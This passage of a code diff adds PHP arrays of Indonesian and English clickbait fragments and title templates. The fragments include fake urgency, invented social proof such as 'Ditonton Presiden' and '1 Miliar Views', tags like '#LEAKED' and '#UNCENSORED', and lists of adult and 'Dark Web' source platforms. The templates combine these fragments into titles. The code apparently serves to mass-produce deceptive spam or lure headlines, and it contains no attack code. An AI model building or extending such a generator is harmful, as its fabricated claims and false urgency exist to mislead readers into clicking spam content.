+    'Temukan Disini', 'Selengkapnya Disini', 'Explore Sekarang', 'Watch Free', 'Langsung Tonton',
+    'Open Access', 'Join Sekarang', 'Enter Now', 'Go Premium', 'Stream Gratis',
+    'Akses Instant', 'Quick Play', 'View Now', 'Nonton Disini', 'Kunjungi Sekarang',
+    'Get Access', 'Lihat Sekarang', 'Buka Pintunya', 'Raih Aksesnya', 'Segera Tonton',
+    'Langsung Klik', 'Mau Nonton?', 'Ayo Masuk', 'Siap Nonton?', 'Go Watch Now',
+    // batch 2 (51-100)
+    'Akses Premium', 'Unlock Full', 'Buka Kunci', 'Masuk VIP', 'Daftar Gratis',
+    'Aktivasi Sekarang', 'Register Now', 'Sign Up Free', 'Mulai Trial', 'Free Access',
+    'Lihat Preview', 'Cek Trailer', 'Sneak Peek', 'First Look', 'Intip Dulu',
+    'Lanjutkan Nonton', 'Resume Play', 'Continue Here', 'Next Episode', 'Bagian Selanjutnya',
+    'Share ke Teman', 'Kirim ke Grup', 'Forward Now', 'Bagikan Link', 'Spread the Word',
+    'Bookmark Ini', 'Save Dulu', 'Simpan Link', 'Pin Konten Ini', 'Tandai Favorit',
+    'Instant Stream', 'Quick Access', 'Rapid Play', 'Turbo Load', 'Fast Stream',
+    'Gabung Sekarang', 'Join Community', 'Be Member', 'Masuk Grup', 'Daftar Member',
+    'Unduh Sekarang', 'Download Free', 'Save Offline', 'Get File', 'Ambil Konten',
+    'Putar Full', 'Watch Complete', 'Nonton Semua', 'See All', 'View Complete',
+);
+
+$p['urgencies'] = array(
+    'Hari Ini', 'Sebelum Ditakedown', 'Edisi Terbatas', 'Limited Time', 'Hanya Hari Ini',
+    'April 2026', 'Mei 2026', 'Terbaru 2026', 'Update Harian', 'Fresh Today',
+    'Baru Saja Upload', 'Baru Rilis', 'Just Dropped', 'Hot Right Now', 'Sedang Viral',
+    'Sebelum Dihapus', 'Sebelum Diblokir', 'Waktu Terbatas', 'Cepat Sebelum Hilang', 'Last Chance',
+    'Tinggal Beberapa Jam', 'Segera Berakhir', 'Deadline Hari Ini', 'Sisa Kuota Terbatas', 'Almost Gone',
+    'Rilis Perdana', 'Premiere Hari Ini', 'Tayang Perdana', 'Baru Muncul', 'Freshly Released',
+    'Breaking Today', 'Just Now', 'Menit Lalu', 'Jam Lalu', 'Baru Detik Ini',
+    'Periode Spesial', 'Flash Access', '24 Jam Saja', '48 Jam Terakhir', 'Weekend Only',
+    'Midnight Drop', 'Early Release', 'Soft Launch', 'Beta Access', 'Pre-Release',
+    'Trending Sekarang', 'Viral Hari Ini', 'Peak Hour', 'Golden Time', 'Prime Slot',
+    // batch 2 (51-100)
+    'Tinggal 1 Jam', 'Tersisa 30 Menit', 'Countdown Dimulai', 'Timer Berjalan', 'Detik-Detik Terakhir',
+    'Rilis Tengah Malam', 'Tayang Subuh', 'Drop Jam 12', 'Launch Pagi Ini', 'Go Live Sore Ini',
+    'Minggu Ini Saja', 'Khusus Bulan Ini', 'April Special', 'Spring Edition', 'Mid-Year Drop',
+    'Anniversary Release', 'Birthday Special', 'Holiday Exclusive', 'Seasonal Drop', 'Year-End Finale',
+    'Batch Terakhir', 'Final Round', 'Last Wave', 'Closing Soon', 'Ending Today',
+    'Restock Alert', 'Back In Stock', 'Kembali Tersedia', 'Available Again', 'Dibuka Kembali',
+    'Early Bird', 'First Dibs', 'Priority Access', 'Head Start', 'Advance Viewing',
+    'Sneak Preview', 'Teaser Drop', 'Trailer Perdana', 'Behind The Scenes', 'Making Of',
+    'Directors Cut Release', 'Extended Version', 'Uncut Edition', 'Remastered Drop', 'Deluxe Version',
+    'Fan Request', 'By Popular Demand', 'Audience Choice', 'Viewer Pick', 'Community Select',
+);
+
+$p['socials'] = array(
+    '10 Juta Views', 'Trending #1', 'Viral di 50 Negara', 'Top Search Google', '100K Share',
+    '5 Juta Penonton', 'Trending Worldwide', '#1 Most Watched', 'Rekor Penonton', 'Jutaan Klik',
+    '50 Juta Impressions', 'Top Trending', 'Masuk Berita Utama', 'Dibahas 1000 Media', '1M Downloads',
+    'Rating 9.8/10', 'Viewers Choice Award', 'Most Viral 2026', 'Pecah Rekor Views', 'Sensasi Global',
+    'Hebohkan Netizen', 'Ramai Diperbincangkan', 'Jadi Trending Topic', 'FYP Everywhere', 'Viral Lintas Negara',
+    'Ditonton Artis', 'Dishare Selebritis', 'Endorsed Influencer', 'Review Bintang 5', 'Top Rated Content',
+    '500K Subscribers', 'Follower Meledak', 'Engagement Tertinggi', 'Like Terbanyak', 'Comment Membludak',
+    'Tersebar ke 100 Negara', 'Global Phenomenon', 'Internet Breaking', 'Crash Server', 'Overload Traffic',
+    'Rekomendasi Editor', 'Staff Pick', 'Curated Selection', 'Premium Choice', 'Expert Approved',
+    'Verified Viral', 'Certified Hit', 'Diamond Content', 'Platinum Grade', 'Hall Of Fame',
+    // batch 2 (51-100)
+    '1 Miliar Views', 'Double Platinum', 'Triple Diamond', 'Record Holder', 'Guinness Material',
+    'CEO Approved', 'Ditonton Presiden', 'Masuk Parlemen', 'Jadi Topik Sidang', 'Dibahas di PBB',
+    'Server Down 3x', 'Website Crash', 'CDN Overload', 'Bandwidth Meledak', 'Queue 1 Juta Orang',
+    'Sold Out 5 Detik', 'Waitlist 500K', 'Pre-Order Habis', 'Reservasi Penuh', 'Kuota Ludes',
+    'Award Winner 2026', 'People Choice', 'Critics Darling', 'Festival Favorite', 'Jury Special',
+    'AI Recommended', 'Algorithm Favorite', 'Curated by Experts', 'Hand Selected', 'Quality Assured',
+    'Community Endorsed', 'Peer Verified', 'User Tested', 'Battle Proven', 'Field Tested',
+    'Translated 50 Bahasa', 'Global Subtitle', 'Multi-Language', 'Universal Content', 'Worldwide Release',
+    'Collab Internasional', 'Cross-Platform Hit', 'Multi-Channel Viral', 'Omnichannel Success', 'Total Domination',
+    'Lifetime Achievement', 'Legacy Content', 'Timeless Classic', 'Evergreen Hit', 'Perennial Favorite',
+);
+
+$p['tones'] = array(
+    'Mengejutkan', 'Bikin Merinding', 'Tak Terduga', 'Kontroversial', 'Menghebohkan',
+    'Memukau', 'Spektakuler', 'Luar Biasa', 'Fantastis', 'Mencengangkan',
+    'Mengguncang', 'Bombastis', 'Sensasional', 'Dramatis', 'Fenomenal',
+    'Epik', 'Legendaris', 'Monumental', 'Historis', 'Revolusioner',
+    'Mendebarkan', 'Menegangkan', 'Menggetarkan', 'Bikin Speechless', 'Mind Blowing',
+    'Gila-gilaan', 'Super Intense', 'Over The Top', 'Next Level', 'Game Changing',
+    'Jaw Dropping', 'Eye Opening', 'Earth Shattering', 'Record Breaking', 'Ground Breaking',
+    'Tidak Masuk Akal', 'Sulit Dipercaya', 'Di Luar Nalar', 'Melampaui Logika', 'Anti Mainstream',
+    'Raw dan Autentik', 'Tanpa Filter', 'Apa Adanya', 'No Clickbait', 'Genuine Content',
+    'Eksklusif Abis', 'Ultra Premium', 'Top Tier', 'S-Tier', 'God Tier',
+    // batch 2 (51-100)
+    'Bikin Nangis', 'Penuh Emosi', 'Haru Biru', 'Heartwarming', 'Menyentuh Hati',
+    'Dark dan Kelam', 'Twisted Plot', 'Plot Twist Gila', 'Unpredictable', 'Full Surprise',
+    'Adrenaline Rush', 'High Octane', 'Non-Stop Action', 'Intense Banget', 'Penuh Aksi',
+    'Ciamik', 'Keren Parah', 'Gokil Abis', 'Mantap Jiwa', 'Sabi Banget',
+    'Creepy', 'Spine Chilling', 'Ngeri-Ngeri Sedap', 'Horror Vibes', 'Seram Tapi Seru',
+    'Wholesome', 'Feel Good', 'Positive Vibes', 'Uplifting', 'Motivational',
+    'Cinematic', 'Film Quality', 'Hollywood Level', 'Oscar Worthy', 'Masterpiece',
+    'Unfiltered Truth', 'No Sugar Coating', 'Blak-Blakan', 'Jujur Total', 'Brutal Honesty',
+    'Binge Worthy', 'Addictive Content', 'Cant Stop Watching', 'Marathon Material', 'Auto Replay',
+    'Chef Kiss', 'Muah Perfect', 'Flawless Execution', 'Pixel Perfect', 'Polished',
+);
+
+$p['adjs'] = array(
+    'Spektakuler', 'Fenomenal', 'Legendaris', 'Bombastis', 'Epik',
+    'Ikonik', 'Megah', 'Dahsyat', 'Hebat', 'Luar Biasa',
+    'Mematikan', 'Ganas', 'Brutal', 'Ekstrem', 'Hardcore',
+    'Elegan', 'Glamor', 'Mewah', 'Premium', 'Eksklusif',
+    'Misterius', 'Enigmatik', 'Rahasia', 'Tersembunyi', 'Underground',
+    'Viral', 'Trending', 'Populer', 'Terkenal', 'Terhits',
+    'Profesional', 'Expert', 'Master Class', 'World Class', 'Top Notch',
+    'Unik', 'Langka', 'Jarang Ada', 'Satu-satunya', 'Pertama di Dunia',
+    'Terpanas', 'Terbaru', 'Terfresh', 'Terkini', 'Paling Update',
+    'Ultimate', 'Supreme', 'Absolute', 'Definitive', 'Unmatched',
+    // batch 2 (51-100)
+    'Menawan', 'Memesona', 'Mempesona', 'Menggoda', 'Memabukkan',
+    'Ganas', 'Buas', 'Liar', 'Savage', 'Barbaric',
+    'Futuristik', 'Sci-Fi', 'Cyberpunk', 'Steampunk', 'Retro',
+    'Klasik', 'Vintage', 'Old School', 'Timeless', 'Abadi',
+    'Kontroversial', 'Provokatif', 'Berani', 'Bold', 'Audacious',
+    'Magis', 'Mistis', 'Supranatural', 'Ethereal', 'Otherworldly',
+    'Colossal', 'Raksasa', 'Masif', 'Gigantic', 'Monumental',
+    'Surgawi', 'Ilahi', 'Divine', 'Celestial', 'Transcendent',
+    'Autentik', 'Genuine', 'Original', 'Asli', 'Murni',
+    'Revolusioner', 'Disruptif', 'Pelopor', 'Pioneer', 'Trailblazer',
+);
+
+$p['tags'] = array(
+    '[VERIFIED]', '(ORIGINAL)', '★TOP RATED★', '#UNCENSORED', '[EXCLUSIVE]',
+    '【PREMIUM】', '▶FULL HD◀', '[NO SENSOR]', '★VIRAL★', '(TRENDING)',
+    '[BREAKING]', '#LEAKED', '[CONFIRMED]', '(AUTHENTIC)', '★MUST SEE★',
+    '[VIP ACCESS]', '#UNCUT', '[RAW]', '(REAL)', '★PLATINUM★',
+    '[CERTIFIED]', '#OFFICIAL', '[LEGIT]', '(GENUINE)', '★ELITE★',
+    '[UNRESTRICTED]', '#UNLIMITED', '[ALL ACCESS]', '(DECODED)', '★UNLOCKED★',
+    '[REMASTERED]', '#DIRECTORS CUT', '[EXTENDED]', '(COMPLETE)', '★ULTIMATE★',
+    '[HD QUALITY]', '#4K ULTRA', '[STUDIO]', '(REFERENCE)', '★PRISTINE★',
+    '[FIRST LOOK]', '#SNEAK PEEK', '[PREMIERE]', '(DEBUT)', '★FRESH★',
+    '[HOT DROP]', '#NEW RELEASE', '[JUST IN]', '(BREAKING NEWS)', '★ALERT★',
+    // batch 2 (51-100)
+    '[CLASSIFIED]', '#RESTRICTED', '[CONFIDENTIAL]', '(TOP SECRET)', '★REDACTED★',
+    '[UNRATED]', '#DIRECTOR CUT', '[FINAL CUT]', '(PRODUCERS CUT)', '★SPECIAL EDIT★',
+    '[IMPORT]', '#OVERSEAS', '[INTERNATIONAL]', '(GLOBAL)', '★WORLDWIDE★',
+    '[RESTORED]', '#RECOVERED', '[SALVAGED]', '(ARCHIVED)', '★PRESERVED★',
+    '[ENHANCED]', '#UPGRADED', '[BOOSTED]', '(AMPLIFIED)', '★MAXED★',
+    '[DECODED]', '#CRACKED', '[SOLVED]', '(REVEALED)', '★EXPOSED★',
+    '[CURATED]', '#SELECTED', '[PICKED]', '(CHOSEN)', '★HANDPICKED★',
+    '[LIVE]', '#REALTIME', '[STREAMING]', '(ON AIR)', '★BROADCASTING★',
+    '[BETA]', '#EARLY ACCESS', '[PREVIEW]', '(PROTOTYPE)', '★ALPHA★',
+    '[COLLECTORS]', '#LIMITED RUN', '[NUMBERED]', '(SIGNED)', '★RARE EDITION★',
+);
+
+$p['platforms'] = array(
+    'dari TikTok', 'di YouTube', 'ex-OnlyFans', 'via Telegram', 'dari Instagram',
+    'di Twitter/X', 'dari Reddit', 'via WhatsApp', 'di Facebook', 'dari Snapchat',
+    'via Discord', 'dari Twitch', 'di Bigo Live', 'via LINE', 'dari WeChat',
+    'di Pornhub', 'dari Xvideos', 'via Xhamster', 'di Chaturbate', 'dari Stripchat',
+    'via Google Drive', 'dari Mega.nz', 'di MediaFire', 'via Dropbox', 'dari Cloud',
+    'di Dark Web', 'dari Deep Web', 'via Private Server', 'di Hidden Forum', 'dari Underground Net',
+    // batch 2 (31-50)
+    'dari Pinterest', 'di Threads', 'via Signal', 'dari Tumblr', 'di Vimeo',
+    'dari Dailymotion', 'via Patreon', 'di Substack', 'dari Medium', 'via Clubhouse',
+    'di Spotify', 'dari SoundCloud', 'via Bandcamp', 'di Mixcloud', 'dari Deezer',
+    'via VK', 'di Weibo', 'dari Douyin', 'via Bilibili', 'di Niconico',
+);
+
+$p['audiences'] = array(
+    'Wajib Nonton', 'Khusus Dewasa', 'Untuk Pecinta Konten', '18+ Only', 'Viewer Sejati',
+    'Buat Yang Berani', 'Pecandu Streaming', 'Night Owl Edition', 'Konten Pilihan', 'Bukan Untuk Semua',
+    'Hanya Untuk Anda', 'Member Exclusive', 'Inner Circle Only', 'True Fans Only', 'VIP Only',
+    'Untuk Penikmat Sejati', 'Penggemar Hardcore', 'Die Hard Fans', 'Koleksi Pribadi', 'Private Collection',
+    'Rekomendasi Khusus', 'Hand Picked', 'Curated For You', 'Personal Selection', 'Tailor Made',
+    'Penonton Setia', 'Subscriber Loyal', 'Dedicated Viewers', 'Core Audience', 'Premium Members',
+    'Para Pencari Konten', 'Explorer Edition', 'Discovery Pass', 'Adventure Seekers', 'Thrill Hunters',
+    'Late Night Special', 'Midnight Edition', 'After Dark', 'Nocturnal Content', 'Witching Hour',
+    // batch 2 (41-50)
+    'Generasi Z Wajib Tahu', 'Millennials Only', 'Boomer Friendly', 'Gen Alpha Preview', 'All Ages Welcome',
+    'Pasangan Goals', 'Single Ready', 'Bestie Approved', 'Squad Material', 'Family Friendly',
+);
+
+// ─── Template Title: 150 Konteks + 150 Instruksi ──────────────────────────────
+$p['titles_konteks'] = array(
+    '{$BRANDS} {$E} {$TAG} {$HOOK} {$W} {$SUBJECT} {$ADJ} {$ACTION} di {$PLACE} — {$SOCIAL} {$CTA}',
+    '{$BRANDS} {$E} Kisah {$TONE} {$W} {$SUBJECT} yang {$ACTION} sebagai {$PROF} {$TAG} {$PLATFORM}',
+    '{$TAG} {$HOOK} {$W} {$E} {$SUBJECT} {$PROF} di {$PLACE} {$BRANDS} — {$SOCIAL} {$AUDIENCE}',
+    '{$BRANDS} {$E} Profil {$ADJ} {$W} {$SUBJECT} sang {$PROF} yang {$ACTION} {$TAG} {$URGENCY}',
+    '{$E} {$HOOK} {$W} {$SUBJECT} {$ADJ} {$ACTION} di {$PLACE} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} — {$SUBJECT} {$E} {$W} {$PROF} yang {$ACTION} {$TONE} di {$PLACE} {$CTA}',
+    '{$TAG} {$BRANDS} {$E} Berita {$TONE} {$W} {$SUBJECT} {$ACTION} sebagai {$PROF} {$URGENCY}',
+    '{$HOOK} {$W} {$E} {$BRANDS} | {$SUBJECT} {$ADJ} di {$PLACE} {$SOCIAL} {$PLATFORM}',
+    '{$BRANDS} {$E} Review {$TONE} {$W} Aksi {$SUBJECT} {$PROF} {$TAG} — {$CTA}',
+    '{$E} Fenomena {$ADJ} {$W} {$SUBJECT} {$ACTION} di {$PLACE} — {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} {$TAG} Mengapa {$W} {$SUBJECT} Ini {$ACTION} {$SOCIAL} {$PLATFORM}',
+    '{$BRANDS} {$E} Dibalik Layar {$TONE} {$W} {$SUBJECT} {$PROF} di {$PLACE} {$CTA}',
+    '{$E} Siapa {$W} {$SUBJECT} {$ADJ} yang {$ACTION} di {$PLACE}? {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} {$TAG} Eksklusif: {$W} {$SUBJECT} {$PROF} {$ACTION} {$URGENCY}',
+    '{$HOOK} {$W} {$E} {$BRANDS} — Aksi {$TONE} {$SUBJECT} di {$PLACE} {$SOCIAL}',
+    '{$BRANDS} {$E} Cerita {$ADJ} {$W} {$SUBJECT} {$ACTION} Saat Bertugas {$CTA} {$TAG}',
+    '{$E} {$BRANDS} Ungkap {$W} Kisah {$TONE} {$SUBJECT} {$PROF} {$PLATFORM} {$AUDIENCE}',
+    '{$BRANDS} {$E} Fakta {$ADJ} {$W} {$SUBJECT} yang Berprofesi {$PROF} {$TAG} {$SOCIAL}',
+    '{$BRANDS} {$E} {$TAG} Sorotan: {$W} {$SUBJECT} {$ACTION} di {$PLACE} — {$CTA} {$URGENCY}',
+    '{$E} Trending {$TONE}: {$W} {$SUBJECT} {$PROF} di {$PLACE} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Potret {$ADJ} {$W} {$SUBJECT} sang {$PROF} {$PLATFORM} {$TAG}',
+    '{$BRANDS} {$E} Feature {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$CTA}',
+    '{$TAG} {$HOOK} {$W} {$E} {$SUBJECT} {$BRANDS} di {$PLACE} — {$ANGKA} {$AUDIENCE}',
+    '{$E} {$BRANDS} Menyajikan {$W} Kisah {$TONE} {$SUBJECT} {$PROF} {$SOCIAL} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} Highlight {$WAKTU}: {$W} Aksi {$EMOSI} {$SUBJECT} di {$PLACE} {$ANGKA}',
+    '{$BRANDS} {$E} Wawancara {$EMOSI} {$W} {$SUBJECT} {$PROF} {$TAG} — {$WAKTU}',
+    '{$E} Reportase {$ADJ}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} — {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Biografi {$W} {$SUBJECT} sang {$PROF} {$TONE} {$TAG} {$URGENCY}',
+    '{$BRANDS} {$E} Jejak {$ADJ} {$W} {$SUBJECT} yang {$ACTION} {$PLATFORM} {$CTA}',
+    '{$E} {$TAG} Special Report {$WAKTU}: {$W} {$SUBJECT} di {$PLACE} | {$BRANDS} {$ANGKA} {$AUDIENCE}',
+    '{$BRANDS} {$E} Transformasi {$EMOSI} {$W} {$SUBJECT} Menjadi {$PROF} {$WAKTU}',
+    '{$BRANDS} {$E} Timeline {$ADJ} {$W} {$SUBJECT} {$PROF} {$ANGKA} — {$CTA} {$URGENCY}',
+    '{$E} Insight {$TONE}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} — {$BRANDS} {$PLATFORM}',
+    '{$BRANDS} {$E} {$TAG} Deep Dive {$WAKTU}: {$W} Dunia {$EMOSI} {$SUBJECT} {$PROF} {$ANGKA}',
+    '{$BRANDS} {$E} Perspektif {$EMOSI} {$W} tentang {$SUBJECT} di {$PLACE} {$WAKTU} {$CTA}',
+    '{$TAG} {$HOOK} {$W} {$E} Tentang {$SUBJECT} {$PROF} | {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Catatan {$ADJ} {$W} {$SUBJECT} ke {$PLACE} {$PLATFORM} {$AUDIENCE}',
+    '{$E} Edisi {$TONE}: {$W} {$SUBJECT} {$ACTION} | {$BRANDS} {$TAG} {$CTA}',
+    '{$BRANDS} {$E} Opini {$ADJ}: Mengapa {$W} {$SUBJECT} Layak Ditonton {$SOCIAL}',
+    '{$BRANDS} {$E} {$TAG} Hot Topic {$WAKTU}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$EMOSI}',
+    '{$E} Headline {$EMOSI} {$WAKTU}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} | {$BRANDS} {$ANGKA}',
+    '{$BRANDS} {$E} Chronicle {$ADJ}: {$W} {$SUBJECT} sang {$PROF} {$WAKTU} {$ANGKA}',
+    '{$BRANDS} {$E} Spotlight {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$AUDIENCE}',
+    '{$E} {$TAG} Breaking: {$W} {$SUBJECT} di {$PLACE} {$ACTION} | {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Jurnal {$ADJ}: {$W} {$SUBJECT} sebagai {$PROF} {$CTA} {$PLATFORM}',
+    '{$BRANDS} {$E} Ulasan {$TONE}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$TAG}',
+    '{$E} Zoom In {$ADJ}: {$W} {$SUBJECT} {$PROF} — {$BRANDS} {$SOCIAL} {$AUDIENCE}',
+    '{$BRANDS} {$E} Narasi {$EMOSI} {$W} {$SUBJECT} yang {$ACTION} {$WAKTU} {$ANGKA}',
+    '{$BRANDS} {$E} {$TAG} Close Up {$WAKTU}: {$W} {$SUBJECT} di {$PLACE} {$EMOSI} {$ANGKA}',
+    '{$E} {$HOOK} {$W} {$SUBJECT} {$PROF} {$ADJ} | {$BRANDS} {$SOCIAL} {$CTA}',
+    // batch 2 (51-100)
+    '{$BRANDS} {$E} Eksposisi {$EMOSI}: {$W} {$SUBJECT} {$ADJ} di {$PLACE} {$ANGKA} {$TAG}',
+    '{$E} Mega Story {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$ACTION} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} {$TAG} Dossier {$ADJ}: {$W} {$SUBJECT} di {$PLACE} {$EMOSI} {$CTA}',
+    '{$E} Laporan Lapangan: {$W} {$SUBJECT} {$PROF} {$ACTION} {$WAKTU} — {$BRANDS} {$ANGKA}',
+    '{$BRANDS} {$E} Profile {$EMOSI} {$W} {$SUBJECT} {$ADJ} sang {$PROF} {$TAG} {$AUDIENCE}',
+    '{$BRANDS} {$E} Skenario {$TONE}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$PLATFORM}',
+    '{$TAG} {$BRANDS} {$E} Radar {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$ANGKA} {$CTA}',
+    '{$E} Ground Zero: {$W} {$SUBJECT} {$ADJ} {$ACTION} di {$PLACE} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Manuskrip {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$TAG} {$URGENCY}',
+    '{$E} Buletin {$ADJ} {$WAKTU}: {$W} {$SUBJECT} di {$PLACE} — {$BRANDS} {$ANGKA} {$CTA}',
+    '{$BRANDS} {$E} Diskografi {$TONE}: {$W} {$SUBJECT} {$ACTION} {$PLATFORM} {$AUDIENCE}',
+    '{$TAG} {$E} Panel {$EMOSI}: {$W} {$SUBJECT} {$PROF} di {$PLACE} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Album {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$ANGKA} {$CTA}',
+    '{$E} Galeri {$TONE}: {$W} {$SUBJECT} {$PROF} di {$PLACE} — {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} Kolom {$EMOSI}: {$W} Mengapa {$SUBJECT} {$ADJ} {$ACTION} {$URGENCY}',
+    '{$E} Compass {$WAKTU}: {$W} {$SUBJECT} {$PROF} di {$PLACE} | {$BRANDS} {$ANGKA} {$PLATFORM}',
+    '{$BRANDS} {$E} {$TAG} Fragmen {$TONE}: {$W} {$SUBJECT} {$ACTION} {$SOCIAL} {$CTA}',
+    '{$E} Atlas {$ADJ}: {$W} {$SUBJECT} {$PROF} di {$PLACE} — {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Kapsul {$EMOSI} {$WAKTU}: {$W} {$SUBJECT} {$ACTION} {$ANGKA} {$TAG}',
+    '{$E} Radar Alert: {$W} {$SUBJECT} {$ADJ} {$PROF} di {$PLACE} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Pulsar {$TONE}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$SOCIAL} {$PLATFORM}',
+    '{$TAG} {$E} Orbit {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$ANGKA} — {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Signal {$ADJ}: {$W} {$SUBJECT} di {$PLACE} {$ACTION} {$CTA} {$AUDIENCE}',
+    '{$E} Pulse {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$TONE} | {$BRANDS} {$TAG} {$SOCIAL}',
+    '{$BRANDS} {$E} Matrix {$EMOSI}: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$ANGKA} {$PLATFORM}',
+    '{$E} Nexus {$TONE}: {$W} {$SUBJECT} {$PROF} di {$PLACE} — {$BRANDS} {$CTA} {$URGENCY}',
+    '{$BRANDS} {$E} {$TAG} Prism {$WAKTU}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} {$SOCIAL}',
+    '{$E} Echo {$ADJ}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Vertex {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$TAG} {$CTA}',
+    '{$E} Spectrum {$TONE}: {$W} {$SUBJECT} {$ADJ} {$PROF} — {$BRANDS} {$SOCIAL} {$PLATFORM}',
+    // batch 3 (101-150)
+    '{$BRANDS} {$E} Vortex {$EMOSI}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$TAG} {$ANGKA}',
+    '{$E} {$HOOK} {$W} {$SUBJECT} {$ADJ} {$PROF} {$WAKTU} — {$BRANDS} {$CTA} {$SOCIAL}',
+    '{$BRANDS} {$E} Cipher {$TONE}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} | {$BRANDS} {$URGENCY}',
+    '{$TAG} {$E} Zenith {$WAKTU}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} {$AUDIENCE}',
+    '{$BRANDS} {$E} Nova {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$PLATFORM} {$CTA} {$SOCIAL}',
+    '{$E} Genesis {$EMOSI}: {$W} {$SUBJECT} {$PROF} di {$PLACE} — {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} {$TAG} Apex {$TONE}: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$WAKTU} {$ANGKA}',
+    '{$E} Catalyst {$EMOSI}: {$W} {$SUBJECT} {$PROF} | {$BRANDS} {$SOCIAL} {$CTA}',
+    '{$BRANDS} {$E} Fusion {$ADJ}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$PLATFORM} {$URGENCY}',
+    '{$TAG} {$E} Aurora {$WAKTU}: {$W} {$SUBJECT} sang {$PROF} {$EMOSI} — {$BRANDS} {$ANGKA}',
+    '{$BRANDS} {$E} Horizon {$TONE}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$TAG} {$AUDIENCE}',
+    '{$E} Chronicle Live: {$W} {$SUBJECT} {$ADJ} {$PROF} di {$PLACE} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} Flashpoint {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$ANGKA} {$SOCIAL}',
+    '{$E} Epicenter: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$WAKTU} — {$BRANDS} {$PLATFORM}',
+    '{$BRANDS} {$E} Meridian {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} {$CTA} {$TAG}',
+    '{$E} Parallax {$TONE}: {$W} {$SUBJECT} {$PROF} {$ANGKA} | {$BRANDS} {$URGENCY} {$SOCIAL}',
+    '{$BRANDS} {$E} Quantum {$EMOSI}: {$W} {$SUBJECT} {$ADJ} di {$PLACE} {$WAKTU} {$AUDIENCE}',
+    '{$TAG} {$E} Titan Report: {$W} {$SUBJECT} {$PROF} {$ACTION} — {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Infinity {$TONE}: {$W} {$SUBJECT} di {$PLACE} {$EMOSI} {$ANGKA} {$PLATFORM}',
+    '{$E} Supernova {$ADJ}: {$W} {$SUBJECT} {$PROF} {$ACTION} {$WAKTU} | {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} Phoenix {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$SOCIAL} {$CTA} {$URGENCY}',
+    '{$E} Obsidian {$TONE}: {$W} {$SUBJECT} {$ADJ} {$PROF} di {$PLACE} — {$BRANDS} {$ANGKA}',
+    '{$BRANDS} {$E} {$TAG} Delta Force: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$EMOSI} {$AUDIENCE}',
+    '{$E} Cosmos {$ADJ}: {$W} {$SUBJECT} {$PROF} {$ANGKA} | {$BRANDS} {$CTA} {$PLATFORM}',
+    '{$BRANDS} {$E} Nebula {$EMOSI}: {$W} {$SUBJECT} di {$PLACE} {$ACTION} {$TAG} {$SOCIAL}',
+    '{$E} Solstice {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$TONE} — {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Axiom {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} {$ANGKA} {$CTA}',
+    '{$TAG} {$E} Monolith: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$WAKTU} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Odyssey {$EMOSI}: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$PLATFORM} {$AUDIENCE}',
+    '{$E} Epoch {$TONE}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} — {$BRANDS} {$TAG} {$CTA}',
+    '{$BRANDS} {$E} Sentinel {$WAKTU}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} {$SOCIAL} {$URGENCY}',
+    '{$TAG} {$E} Forge {$ADJ}: {$W} {$SUBJECT} {$PROF} di {$PLACE} | {$BRANDS} {$ANGKA}',
